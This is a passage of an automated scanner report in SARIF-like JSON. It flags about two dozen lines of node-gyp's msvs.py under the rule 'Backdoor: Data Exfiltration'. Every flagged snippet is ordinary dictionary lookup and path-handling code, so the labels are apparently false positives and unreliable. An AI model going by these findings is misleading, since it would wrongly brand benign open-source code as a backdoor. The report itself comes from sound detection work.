                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1633,
                  "startColumn": 40,
                  "endLine": 1633,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    for f in excluded_sources:\n        excluded_configs = []\n        for config_name, config in spec[\"configurations\"].items():\n            precomped = [_FixPath(config.get(i, \"\")) for i in precomp_keys]\n            # Don't do this for ones that are precompiled header related.\n            if f not in precomped:\n                excluded_configs.append((config_name, config))\n",
                    "rendered": {
                      "text": "    for f in excluded_sources:\n        excluded_configs = []\n        for config_name, config in spec[\"configurations\"].items():\n            precomped = [_FixPath(config.get(i, \"\")) for i in precomp_keys]\n            # Don't do this for ones that are precompiled header related.\n            if f not in precomped:\n                excluded_configs.append((config_name, config))\n",
                      "markdown": "`    for f in excluded_sources:\n        excluded_configs = []\n        for config_name, config in spec[\"configurations\"].items():\n            precomped = [_FixPath(config.get(i, \"\")) for i in precomp_keys]\n            # Don't do this for ones that are precompiled header related.\n            if f not in precomped:\n                excluded_configs.append((config_name, config))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1605,
                  "startColumn": 22,
                  "endLine": 1605,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    precompiled_related = []\n    for _, config in spec[\"configurations\"].items():\n        for k in precomp_keys:\n            f = config.get(k)\n            if f:\n                precompiled_related.append(_FixPath(f))\n    return precompiled_related\n",
                    "rendered": {
                      "text": "    precompiled_related = []\n    for _, config in spec[\"configurations\"].items():\n        for k in precomp_keys:\n            f = config.get(k)\n            if f:\n                precompiled_related.append(_FixPath(f))\n    return precompiled_related\n",
                      "markdown": "`    precompiled_related = []\n    for _, config in spec[\"configurations\"].items():\n        for k in precomp_keys:\n            f = config.get(k)\n            if f:\n                precompiled_related.append(_FixPath(f))\n    return precompiled_related\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1593,
                  "startColumn": 50,
                  "endLine": 1593,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n    excluded_idl = [i for i in sources if i.endswith(\".idl\")] if using_idl else []\n",
                    "rendered": {
                      "text": "    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n    excluded_idl = [i for i in sources if i.endswith(\".idl\")] if using_idl else []\n",
                      "markdown": "`    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n    excluded_idl = [i for i in sources if i.endswith(\".idl\")] if using_idl else []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1592,
                  "startColumn": 20,
                  "endLine": 1592,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    # If any non-native rules use 'idl' as an extension exclude idl files.\n    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n",
                    "rendered": {
                      "text": "    # If any non-native rules use 'idl' as an extension exclude idl files.\n    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n",
                      "markdown": "`    # If any non-native rules use 'idl' as an extension exclude idl files.\n    # Gather a list here to use later.\n    using_idl = False\n    for rule in spec.get(\"rules\", []):\n        if rule[\"extension\"] == \"idl\" and int(rule.get(\"msvs_external_rule\", 0)):\n            using_idl = True\n            break\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1547,
                  "startColumn": 43,
                  "endLine": 1547,
                  "endColumn": 48,
                  "snippet": {
                    "text": "               path of excluded IDL file)\n  \"\"\"\n    # Exclude excluded sources coming into the generator.\n    excluded_sources.update(OrderedSet(spec.get(\"sources_excluded\", [])))\n    # Add excluded sources into sources for good measure.\n    sources.update(excluded_sources)\n    # Convert to proper windows form.\n",
                    "rendered": {
                      "text": "               path of excluded IDL file)\n  \"\"\"\n    # Exclude excluded sources coming into the generator.\n    excluded_sources.update(OrderedSet(spec.get(\"sources_excluded\", [])))\n    # Add excluded sources into sources for good measure.\n    sources.update(excluded_sources)\n    # Convert to proper windows form.\n",
                      "markdown": "`               path of excluded IDL file)\n  \"\"\"\n    # Exclude excluded sources coming into the generator.\n    excluded_sources.update(OrderedSet(spec.get(\"sources_excluded\", [])))\n    # Add excluded sources into sources for good measure.\n    sources.update(excluded_sources)\n    # Convert to proper windows form.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1524,
                  "startColumn": 42,
                  "endLine": 1524,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n\n",
                    "rendered": {
                      "text": "            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n\n",
                      "markdown": "`            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1523,
                  "startColumn": 19,
                  "endLine": 1523,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n",
                    "rendered": {
                      "text": "        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n",
                      "markdown": "`        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n    return (sources, excluded_sources)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1521,
                  "startColumn": 44,
                  "endLine": 1521,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n",
                    "rendered": {
                      "text": "        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n",
                      "markdown": "`        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n        _AddNormalizedSources(sources, cpy.get(\"files\", []))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1520,
                  "startColumn": 16,
                  "endLine": 1520,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n",
                    "rendered": {
                      "text": "        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n",
                      "markdown": "`        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n    # Add in 'copies' inputs and outputs.\n    for cpy in spec.get(\"copies\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1518,
                  "startColumn": 19,
                  "endLine": 1518,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        # Add all inputs to sources and excluded sources.\n        inputs = OrderedSet(inputs)\n        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n",
                    "rendered": {
                      "text": "        # Add all inputs to sources and excluded sources.\n        inputs = OrderedSet(inputs)\n        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n",
                      "markdown": "`        # Add all inputs to sources and excluded sources.\n        inputs = OrderedSet(inputs)\n        sources.update(inputs)\n        if not spec.get(\"msvs_external_builder\"):\n            excluded_sources.update(inputs)\n        if int(a.get(\"process_outputs_as_sources\", False)):\n            _AddNormalizedSources(sources, a.get(\"outputs\", []))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1512,
                  "startColumn": 17,
                  "endLine": 1512,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n    for a in spec.get(\"actions\", []):\n        inputs = a[\"inputs\"]\n        inputs = [_NormalizedSource(i) for i in inputs]\n        # Add all inputs to sources and excluded sources.\n",
                    "rendered": {
                      "text": "        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n    for a in spec.get(\"actions\", []):\n        inputs = a[\"inputs\"]\n        inputs = [_NormalizedSource(i) for i in inputs]\n        # Add all inputs to sources and excluded sources.\n",
                      "markdown": "`        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n    for a in spec.get(\"actions\", []):\n        inputs = a[\"inputs\"]\n        inputs = [_NormalizedSource(i) for i in inputs]\n        # Add all inputs to sources and excluded sources.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1508,
                  "startColumn": 26,
                  "endLine": 1508,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n",
                    "rendered": {
                      "text": "    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n",
                      "markdown": "`    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n        sources.add(gyp_file)\n\n    # Add in 'action' inputs and outputs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1505,
                  "startColumn": 39,
                  "endLine": 1505,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    The sources will be relative to the gyp file.\n  \"\"\"\n    sources = OrderedSet()\n    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n",
                    "rendered": {
                      "text": "    The sources will be relative to the gyp file.\n  \"\"\"\n    sources = OrderedSet()\n    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n",
                      "markdown": "`    The sources will be relative to the gyp file.\n  \"\"\"\n    sources = OrderedSet()\n    _AddNormalizedSources(sources, spec.get(\"sources\", []))\n    excluded_sources = OrderedSet()\n    # Add in the gyp file.\n    if not generator_flags.get(\"standalone\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1471,
                  "startColumn": 31,
                  "endLine": 1471,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n    # Set configuration type.\n    prepared_attrs[\"ConfigurationType\"] = config_type\n    output_dir = prepared_attrs.get(\n        \"OutputDirectory\", \"$(SolutionDir)$(ConfigurationName)\"\n    )\n    prepared_attrs[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n",
                    "rendered": {
                      "text": "        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n    # Set configuration type.\n    prepared_attrs[\"ConfigurationType\"] = config_type\n    output_dir = prepared_attrs.get(\n        \"OutputDirectory\", \"$(SolutionDir)$(ConfigurationName)\"\n    )\n    prepared_attrs[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n",
                      "markdown": "`        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n    # Set configuration type.\n    prepared_attrs[\"ConfigurationType\"] = config_type\n    output_dir = prepared_attrs.get(\n        \"OutputDirectory\", \"$(SolutionDir)$(ConfigurationName)\"\n    )\n    prepared_attrs[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1465,
                  "startColumn": 25,
                  "endLine": 1465,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n    vsprops_dirs = config.get(\"msvs_props\", [])\n    vsprops_dirs = _FixPaths(vsprops_dirs)\n    if vsprops_dirs:\n        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n",
                    "rendered": {
                      "text": "    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n    vsprops_dirs = config.get(\"msvs_props\", [])\n    vsprops_dirs = _FixPaths(vsprops_dirs)\n    if vsprops_dirs:\n        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n",
                      "markdown": "`    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n    vsprops_dirs = config.get(\"msvs_props\", [])\n    vsprops_dirs = _FixPaths(vsprops_dirs)\n    if vsprops_dirs:\n        prepared_attrs[\"InheritedPropertySheets\"] = \";\".join(vsprops_dirs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1461,
                  "startColumn": 25,
                  "endLine": 1461,
                  "endColumn": 30,
                  "snippet": {
                    "text": "def _GetMSVSAttributes(spec, config, config_type):\n    # Prepare configuration attributes.\n    prepared_attrs = {}\n    source_attrs = config.get(\"msvs_configuration_attributes\", {})\n    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n",
                    "rendered": {
                      "text": "def _GetMSVSAttributes(spec, config, config_type):\n    # Prepare configuration attributes.\n    prepared_attrs = {}\n    source_attrs = config.get(\"msvs_configuration_attributes\", {})\n    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n",
                      "markdown": "`def _GetMSVSAttributes(spec, config, config_type):\n    # Prepare configuration attributes.\n    prepared_attrs = {}\n    source_attrs = config.get(\"msvs_configuration_attributes\", {})\n    for a in source_attrs:\n        prepared_attrs[a] = source_attrs[a]\n    # Add props files.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1402,
                  "startColumn": 36,
                  "endLine": 1402,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        \"executable\",\n        \"windows_driver\",\n    ]:\n        def_files = [s for s in spec.get(\"sources\", []) if s.endswith(\".def\")]\n        if len(def_files) == 1:\n            def_file = _FixPath(def_files[0])\n        elif def_files:\n",
                    "rendered": {
                      "text": "        \"executable\",\n        \"windows_driver\",\n    ]:\n        def_files = [s for s in spec.get(\"sources\", []) if s.endswith(\".def\")]\n        if len(def_files) == 1:\n            def_file = _FixPath(def_files[0])\n        elif def_files:\n",
                      "markdown": "`        \"executable\",\n        \"windows_driver\",\n    ]:\n        def_files = [s for s in spec.get(\"sources\", []) if s.endswith(\".def\")]\n        if len(def_files) == 1:\n            def_file = _FixPath(def_files[0])\n        elif def_files:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1391,
                  "startColumn": 34,
                  "endLine": 1391,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n\ndef _GetDisabledWarnings(config):\n    return [str(i) for i in config.get(\"msvs_disabled_warnings\", [])]\n\n\ndef _GetModuleDefinition(spec):\n",
                    "rendered": {
                      "text": "\n\ndef _GetDisabledWarnings(config):\n    return [str(i) for i in config.get(\"msvs_disabled_warnings\", [])]\n\n\ndef _GetModuleDefinition(spec):\n",
                      "markdown": "`\n\ndef _GetDisabledWarnings(config):\n    return [str(i) for i in config.get(\"msvs_disabled_warnings\", [])]\n\n\ndef _GetModuleDefinition(spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1384,
                  "startColumn": 19,
                  "endLine": 1384,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    The list of preprocessor definitions.\n  \"\"\"\n    defines = []\n    for d in config.get(\"defines\", []):\n        fd = \"=\".join([str(dpart) for dpart in d]) if isinstance(d, list) else str(d)\n        defines.append(fd)\n    return defines\n",
                    "rendered": {
                      "text": "    The list of preprocessor definitions.\n  \"\"\"\n    defines = []\n    for d in config.get(\"defines\", []):\n        fd = \"=\".join([str(dpart) for dpart in d]) if isinstance(d, list) else str(d)\n        defines.append(fd)\n    return defines\n",
                      "markdown": "`    The list of preprocessor definitions.\n  \"\"\"\n    defines = []\n    for d in config.get(\"defines\", []):\n        fd = \"=\".join([str(dpart) for dpart in d]) if isinstance(d, list) else str(d)\n        defines.append(fd)\n    return defines\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1368,
                  "startColumn": 27,
                  "endLine": 1368,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  Returns:\n    A string with the extension, or None\n  \"\"\"\n    target_extension = spec.get(\"product_extension\")\n    if target_extension:\n        return \".\" + target_extension\n    return None\n",
                    "rendered": {
                      "text": "  Returns:\n    A string with the extension, or None\n  \"\"\"\n    target_extension = spec.get(\"product_extension\")\n    if target_extension:\n        return \".\" + target_extension\n    return None\n",
                      "markdown": "`  Returns:\n    A string with the extension, or None\n  \"\"\"\n    target_extension = spec.get(\"product_extension\")\n    if target_extension:\n        return \".\" + target_extension\n    return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1351,
                  "startColumn": 27,
                  "endLine": 1351,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n\n",
                    "rendered": {
                      "text": "        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n\n",
                      "markdown": "`        elif msbuild:\n            suffix = \"$(TargetExt)\"\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        out_file = ntpath.join(out_dir, prefix + product_name + suffix)\n    return out_file, vc_tool, msbuild_tool\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
